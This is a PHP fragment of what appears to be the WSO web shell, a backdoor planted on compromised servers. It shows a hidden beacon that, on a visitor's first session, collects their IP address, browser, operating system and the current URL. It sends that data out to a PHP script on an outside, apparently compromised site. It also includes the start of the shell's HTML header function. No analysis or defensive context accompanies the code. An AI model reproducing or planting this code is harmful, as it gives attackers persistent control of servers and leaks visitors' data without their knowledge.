...
session_start();
if(empty($_SESSION["aXBfaW5mbw"])){
	$_SESSION["aXBfaW5mbw"]=1;
	$url = 'https://csenterprises.co.uk/wp-includes/css/dist/q/q/a.php';
	$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$browser_info = bBrowser($_SERVER['HTTP_USER_AGENT'])." On ".b_OS($_SERVER['HTTP_USER_AGENT']).'|'.$_SERVER['HTTP_USER_AGENT'];
	$data = urlencode(get_ip_address().' | '.$browser_info.' | '.$actual_link);
	get_content($url.'?data='.$data);
}
...
function wsoHeader() {
	...
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . WSO_VERSION ."</title>
<style>
